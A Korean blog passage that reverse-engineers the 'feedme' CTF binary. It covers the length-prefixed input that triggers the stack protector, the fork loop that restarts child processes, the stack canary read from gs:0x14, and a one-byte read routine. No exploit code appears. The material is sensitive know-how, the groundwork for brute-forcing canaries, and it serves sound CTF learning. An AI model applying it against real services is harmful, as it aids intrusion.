+<h2 id="바이너리-분석" style="position:relative;"><a href="#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D" aria-label="바이너리 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>바이너리 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY052LWw6CMBQFuw9A+gJpFah6eUh5ClblA/XL/e/EKMZ/TSYnk5MMMuOj6u+6mcr2Wna3opkyPUJ+SoqLgmGTHhX0KhlgfxZhqWCIdh3kRkaVSgbUGZPqOiuqTNeQawVpDGkQxiu1DcLYwtQmzCbMwtSh3CbMofzrKCsbuly7PHC5cHmwYEvsCeJL4kvsSewJ/PoF9j47Mzsqmo748h3/DNLt4e/4CVXVMm/fNImLAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./1.png"
+        title="./1.png"
+        src="/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png"
+        srcset="/static/11625927a76f72f4a6ec20acec8cc1e8/e9ff0/1.png 180w,
+/static/11625927a76f72f4a6ec20acec8cc1e8/f21e7/1.png 360w,
+/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png 720w,
+/static/11625927a76f72f4a6ec20acec8cc1e8/9f82e/1.png 820w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>로직 분석1</p>
+<ul>
+<li><code class="language-text">feedme</code> 바이너리의 입력 값으로 <code class="language-text">A</code> 를 <code class="language-text">0x41</code> 입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAeUlEQVQI12Pw9E2yd/HVMbTW0rfQ0rPU0rfU1LPQ0reEIA1dc009C3UdM20DK1VNYw1dc3UdMy19S3VtU3UdMwYPn2gbR2d5FXUZRRVZJVUMpAZnyymjsOWU1RjcvCIs7ewVVDXkVdRJRQxe/qn2zn7KGiaKakakIgDiQSf6vR+/TAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./2.png"
+        title="./2.png"
+        src="/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png"
+        srcset="/static/8a0c14e4baea697b61cf6107a4ad1355/e9ff0/2.png 180w,
+/static/8a0c14e4baea697b61cf6107a4ad1355/f21e7/2.png 360w,
+/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png 720w,
+/static/8a0c14e4baea697b61cf6107a4ad1355/9d76a/2.png 829w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>로직 분석2</p>
+<ul>
+<li>하지만 <code class="language-text">feedme</code> 바이너리의 입력 값으로 <code class="language-text">A</code>를 <code class="language-text">0x40</code> 번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvElEQVQI13XKyWqFMBSAYZ+kFKqY0ZPhJEZDosbhVi4tt8Oi7/8kRbou/Itv8Vch3fP6mcpj2b/38yeXD+M3DDc33KSZFa5CZYVry0ND+yv2h1BTrIapjFMZ8mxDdGPyMbsx2RABe6GxQ8/AAPZEAANDJHBliQR6mVdxPoZcfJwx5IaD0E4aT6SmnWVgr6kzXCHtTCs1A8sVCuVarl8IqbbXt/P967g/lu1My+HHKS67cqHh3XND/4891fUvMfwwJ0yI7oIAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./3.png"
+        title="./3.png"
+        src="/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png"
+        srcset="/static/7d8e3ef1f2c06de1ff2d556400940e4a/e9ff0/3.png 180w,
+/static/7d8e3ef1f2c06de1ff2d556400940e4a/f21e7/3.png 360w,
+/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png 720w,
+/static/7d8e3ef1f2c06de1ff2d556400940e4a/f2d92/3.png 1027w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>systemcall</p>
+<ul>
+<li>system 호출 범위를 분석하던 중 <code class="language-text">SIGCHILD</code> 시그널을 보낸 후 <code class="language-text">write</code> 함수를 바탕으로 <code class="language-text">Child exit</code> 출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는 <code class="language-text">fork</code> 함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다.</li>
+</ul>
+<h2 id="main-함수-분석" style="position:relative;"><a href="#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="main 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>main 함수 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 520px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAABuElEQVQoz42TW0/jMBCF+/9/Dm/wAm+rFXQlukWtkjRNc7/YCb7Ed3tWJVqERIFaR37yN2fm2F49PqKnJ7TZTH2vs8zGsTkczDiaftAD0v2gy9JkmclzU5bnPc9N1xmEzlq1rcE4YAwhgJTWWq+1s9bBFWtFqQU4kyHAfo+UsmVBkxSXw0AUZZp/ZpbDIXyAAaCumbEeI3mqUDqlk3h9lcT7IKU1xhvjhLDGuAvOAJBlk3O+adjLS9+2vMjYKR/rsR/QzKjCeK4qMo7iMpwkoxCm69h6XW+3XZxgQmQ3N9pazkGIr2de2pbSiNm1reLcUKoY1coqrT0hwPm3cBRhY3xds90OHY/T9m+/2ReYTdqp/1EF7/3ltNuWAUDf8yhCGM/5ieySqsDNO2ytlVIuVT7PjLV2TcM2mzZJcF0zPqtZKx/cD/cMAHlOlLLjKA6Hcb8f4hhjLK56JAustcNYRBFO06nruLV+6fA7eEkhjkdK9TCI9Z/q1+9TUZD3uj871zWZZ6WkY1w6sBDAvRl/pRUhLgSg9GyepuJ41O6qT/HmfHPT3N42d3f98zO7vxcPD/N2y3e7q/QPzlKVdPNkF8UAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./4.png"
+        title="./4.png"
+        src="/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png"
+        srcset="/static/6697a2c2b8d19ca8f31b9959bf080b46/e9ff0/4.png 180w,
+/static/6697a2c2b8d19ca8f31b9959bf080b46/f21e7/4.png 360w,
+/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png 520w"
+        sizes="(max-width: 520px) 100vw, 520px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>main 함수 분석</p>
+<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">
+<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">ssignal</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> sub_8048E24<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0x96u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_804F820</span><span class="token punctuation">(</span>off_80EA4BC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_80490B0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre></div>
+<ul>
+<li>main 함수 내부에서는 <code class="language-text">alarm</code>, <code class="language-text">ssignal</code>, <code class="language-text">setvbuf</code> 함수를 바탕으로 기본적인 초기화 과정을 거치며 <code class="language-text">sub_80490B0</code> 함수를 호출하는 것을 확인할 수 있다.</li>
+</ul>
+<h2 id="sub_80490b0-함수-분석" style="position:relative;"><a href="#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="sub_80490b0 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>sub_80490B0 함수 분석</h2>
+<ul>
+<li><code class="language-text">sub_80490B0</code> 함수를 <code class="language-text">solve</code> 라 명칭하겠다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABvElEQVQoz22Sh44bMQxE/f8fGCS+i+9ctniLtVQlRUoMFi6xnRCCIGD0NARHm2Fwx+Pc92CtOCfer/t1fX/btoVxDNYyAL+pzslmv7/0fey6OE0CoIjKrLWqqk5T+vq6nE7QtmGey1UV0UdtDvupa8PpGM8dDWdeFnVOU1Ii7fu4241NE6epzrOOoxqz8tenVzhSISmlKnLNUtfTvaxl7wmxiFQiISrP6gq7Xx18TObnaH40abJSVe8XLhdalhwjep/nGVPKIq9w7GDeh+F3dI1Tys+atewcG5PniRFfsBtsfd3ty6GRDuCSDODiyCVk5hqjwFIOJzovZkEDCC7bhMJc7s6BF8Mx1EwFUURW4ToS5ySEDCDBK1FNKJTloa5wCHI+l6ZFn9DHRJmf2waQYaJ2cD5hSvzwvMEA9fNTjw0tAahgZnkMLAQ2Fz2PIbLPJb+N+urMMZYYMxcpa1Ly6Aogh8AJxUcqtayBvuIb53S71f2RBjv57B361fzJuRmsSbMn5zG859y29WOrh9YCLjEn4b9BWyunU9kdXTuaRFj/CWsT4/ofY5S1Ya0ihfk2M2MyUc1ZKUut/8n5D3X1LEp5ihktAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./5.png"
+        title="./5.png"
+        src="/static/2a8f1592256c22c46abb4254b448d784/37523/5.png"
+        srcset="/static/2a8f1592256c22c46abb4254b448d784/e9ff0/5.png 180w,
+/static/2a8f1592256c22c46abb4254b448d784/f21e7/5.png 360w,
+/static/2a8f1592256c22c46abb4254b448d784/37523/5.png 720w,
+/static/2a8f1592256c22c46abb4254b448d784/f1d1f/5.png 739w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>sub_80490B0</p>
+<ul>
+<li><code class="language-text">0x31F</code> 반복을 돌면서 각각의 내부 조건을 수행하게 되는 것을 확인할 수 있다.</li>
+<li><code class="language-text">sub_806CC70</code> 함수를 확인해 보면 내부적으로 __lib_fork 함수를 사용하는 것을 확인할 수 있으며 해당 부분에서 자식 프로세스를 생성하는 것을 확인할 수 있다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY00XH226DMBBFUf7/2/pSRUkDqQNhsA0ejxnHXAoxpkKpVGnpaJ8M7gPcluK0isvU1SN388zrzK+pXyc+/F1e//XLxGugJTPClsJADVo12CmH2pGyFrxr2Wl2rSNJJHtSiDXa2tomMHruvFIZW4KlKUP1/RT3UD0GqALc/B1GJXx1cfmXKwoWZaiv/e1C+ZmuctAw6dbI7PkwRpaoyk4KaHJoCmzBdgdn5Ei4sp97NxAOhCPZYM1AOPX0oymzZ40flfrM6ZRv6PeU0uuVYkwx7nHbt7THdOzb0fu747L9ApK0FeRmfXaKAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./6.png"
+        title="./6.png"
+        src="/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png"
+        srcset="/static/65cd5350cc7e3cb56386d42994f0a2de/e9ff0/6.png 180w,
+/static/65cd5350cc7e3cb56386d42994f0a2de/f21e7/6.png 360w,
+/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png 720w,
+/static/65cd5350cc7e3cb56386d42994f0a2de/bad1b/6.png 841w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>fork 함수</p>
+<h2 id="sub_804f700-feedme-함수-분석" style="position:relative;"><a href="#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="sub_804f700 feedme 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>sub_804F700 [feedme] 함수 분석</h2>
+<ul>
+<li><code class="language-text">sub_804F700</code> 함수를 feedme 로 명칭하겠다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABuUlEQVQoz12S6W7bMBCE9f5Pll9BnLhoncSt7NhSdVASKYmHeHwFVcAousAAxGI4O3sUZSmpa8kwaKbJotSGUpFlCWgdcC7SdZbLRdI0kq6bEUKjlGee//KMCVgb91xRVQu328gwOLrOYYzHe4iRR2Ty9SqpqgkhLF3n99z/PO8jRdMo2kbQdStC5IqwrqAUaJ32D1pH6nqibXradqLvA1JmZzDPIGXCOTAmUojeMYyaXjia1jGOnr7PThPWQgjsrbdt5hnU7KgqS9N4hHAMw7aLZeTCRXUP1K3l7XPgeFroe4s2DkiPVrLg1zXSiJVzJTiXK3KCZXE45x+8bcuCled0ijy/WI7fZ7re4lxC640Y00PwevV8fEa+/Zi512JfXm5RKfsQzQssbreN+91TVpJLLWk7wyAs6+ozYVdc15AuFx/r3z6U9RibQcZe2Cili0q5aEyIKaXoXIzFOOZ5BM5nuH3l4eZTcfwTKTuta01VBX79ZEfbaoxxhJDYNkgp4X2ieHoaeH6WvL4uvL0pPj5W3t9XTqclI+X38Tibslxe29a9CBEO47gd1jUcjIkHrcMOY8JhmvzhD4ZSsIlwhiWSAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./7.png"
+        title="./7.png"
+        src="/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png"
+        srcset="/static/e7359106c06c98ffe43174a04ec4a34f/e9ff0/7.png 180w,
+/static/e7359106c06c98ffe43174a04ec4a34f/f21e7/7.png 360w,
+/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png 720w,
+/static/e7359106c06c98ffe43174a04ec4a34f/f1d1f/7.png 739w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span>
+sub_804F700 함수</p>
+<ul>
+<li>v3, v4의 변수들은 <code class="language-text">.bss</code> 섹션에 존재하는 것을 확인할 수 있으며 서로 <code class="language-text">0x20</code> 차이가 난다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQY00XNsXKCMByAcV7ZCe21g/bODn2aDr5Apy71lACi/hMhEJAQCJQQQaj06tD+9u8+w/4MvA1OTpLTViZ6UO0XV8TlMq5EKFRWr95WD7On5fJ1Pl8+L16m00fTfDTN2WSyMLx3dkQyJcp3OsXbseuulU5wJpksz/V3Xqc+pSyE46Fp1DD0fX9lLOr7VojOOH4g2GxkkNbxpS/U2OgLr3yU6LTIg0jsT9jxgBDP87IsK8syz/P9/iAEB8gMgAgDqFqN43i73cZxbNs+CitV6/T8CwB2u517Z9s2Y0zKUghOiDDCkMcx01r/xV03pKnSupWyKPKCEGJZ1na7tSzLcZwgCIqioNQH4AZAiDEo9X++XPowrJRq7uMzxhghtF6vEUKu61JKy7JijGLMfwD+4DwlHxs0DgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./8.png"
+        title="./8.png"
+        src="/static/5131db72b51927f1af07b2eda0f092da/37523/8.png"
+        srcset="/static/5131db72b51927f1af07b2eda0f092da/e9ff0/8.png 180w,
+/static/5131db72b51927f1af07b2eda0f092da/f21e7/8.png 360w,
+/static/5131db72b51927f1af07b2eda0f092da/37523/8.png 720w,
+/static/5131db72b51927f1af07b2eda0f092da/f941f/8.png 736w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>차이</p>
+<ul>
+<li>해당 v4 변수를 canary로 명칭한 이유는 <code class="language-text">gs:0x14</code> 주소의 카나리 값을 스택 버퍼와 스택 프레임 포인터 사이에 랜덤한 값을 삽입한 후 함수 종료 지점에서 랜덤 값 변조 여부를 검사하는 것을 확인할 수 있기 때문이다.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB40lEQVQozy2R2W7bMBBF9f+/1Jc+NG3QNE7l7HbiWLtpaqVkUhJFnUJyCVxwMDgzmLnjHY8NWdZQlpq67lFqRClH101oPTEMDil7gqBBiAYpW4pCo5Slba+cMRN979acl6YdcVRRFj1SDhhtsRbcNAOLWOEwaEiTimLlRnozYUdw7sosz1qHJ2SHyCtkacirmVZDZ0BdQA/guP6pUIi85FwoZOmo2xkzsvKNgmEAYxxevk2ptyGln5BvEuptSvE3xuxO9HuBPQj6XYbcRCvXvSac7iLO98laUz1EDGpkGEFrh5fuOsSh5sVPedvklMeKXtbXEdsLdBpzbolfOmRY8LVLOL4UqOSCFjVj3ix7ryuP49LwDG8HuH+eeNobZG0ZZtB2xv33RlsIUtgf4flDk8iaRs8YC8pMDNPVx+WAXrzvSHYtwYcgPAhkUFNGNVq2DNVlXgy9yG4OX1uXfbZT8Jm5cyxcETVOZcqpU+P6vHNzP7phnJ1XP8YUviD8WXL6I7FfAvuVQpZDmkNezHMoOT/EiI0g+lUQ3ebk25j+kOGinPFDMIsKO4N3+y3h4XvK4w/B003G7u686v23WDQv8fPNyQQP2Va+53+LfeVXn4V/CUvfxJV/iStfB4WvZefXavL/AQSOplOaUVvMAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./9.png"
+        title="./9.png"
+        src="/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png"
+        srcset="/static/1557e68d838e34bd4d6a6448ba5a836f/e9ff0/9.png 180w,
+/static/1557e68d838e34bd4d6a6448ba5a836f/f21e7/9.png 360w,
+/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png 720w,
+/static/1557e68d838e34bd4d6a6448ba5a836f/f1d1f/9.png 739w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>카나리 체크 함수</p>
+<h2 id="sub_8048e42-read_byte-함수-분석" style="position:relative;"><a href="#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D" aria-label="sub_8048e42 read_byte 함수 분석 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>sub_8048E42 [read_byte] 함수 분석</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 562px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 48.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHUlEQVQoz5WQW2rDMBBFvb9uoPvrgorB4JAYmgeyLUtjW5YfUqSZKXba0I8Q0uEiLgMHNCfZ79/Kavd17A6F2O0uRVEdj0rp2ZjYm2BM6Pst5jd/ejIMipmJkPkWIkIi4hcmKUt5OHxmWZ1lzTxHpeY8V1VlhRgAcBi461hrbpq1GLMWgLWvMLQfAO9S1k0zKYVah7pGAFKKxpGUWsm25XFkIkbkGH/KCi+LZ3bMHCOFwNsJ7D1dr+g9hkDbHh/ekbQtAuCyXAE4z0lKLApKU3+5dGU5ah2sdUIMiA/opGkmKa3WqBQCjFovxri7sOfmEueiEJimQcrlfB6s9bef399ncF1Pp1MrRG9tNCbgTcVrkwD4zRB7vxpy7h/5BoxDQU3G+9bLAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="./10.png"
+        title="./10.png"
+        src="/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png"
+        srcset="/static/7ca367a7e3dae4bb6313744d840d7e1b/e9ff0/10.png 180w,
+/static/7ca367a7e3dae4bb6313744d840d7e1b/f21e7/10.png 360w,
+/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png 562w"
+        sizes="(max-width: 562px) 100vw, 562px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>sub_8048E42 함수</p>
+<ul>
+<li>지역 변수 <code class="language-text">v1</code> 에 1 바이트씩 <code class="language-text">read</code> 함수를 바탕으로 입력을 받는 것을 확인할 수 있다.</li>
+<li><code class="language-text">v2</code> 변수는 read 함수의 파일의 사이즈 이며 결국 1을 반환하겠지만 만약 실패할시 프로세스를 종료하는 것을 확인할 수 있다.</li>
+<li>해당 함수의 반환 값은 사용자의 1 바이트 입력한 값이다.</li>
+</ul>
